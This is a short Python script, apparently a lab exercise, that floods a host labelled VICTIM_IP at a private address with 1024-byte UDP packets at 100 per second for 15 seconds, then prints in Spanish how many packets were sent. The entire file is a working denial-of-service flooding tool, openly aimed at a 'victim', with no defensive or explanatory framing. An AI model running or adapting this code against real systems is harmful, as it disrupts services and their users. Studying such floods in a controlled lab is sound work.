import socket
import time

VICTIM_IP = "172.20.10.2"
VICTIM_PORT = 9999
DURATION = 15
PACKET_SIZE = 1024
PACKETS_PER_SECOND = 100
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = b"A" * PACKET_SIZE
end_time = time.time() + DURATION
delay = 1 / PACKETS_PER_SECOND
sent = 0
try:
    while time.time() < end_time:
        sock.sendto(data, (VICTIM_IP, VICTIM_PORT))
        sent += 1
        time.sleep(delay)
except KeyboardInterrupt:
    pass
finally:
    sock.close()
print(f"Paquetes enviados: {sent}")
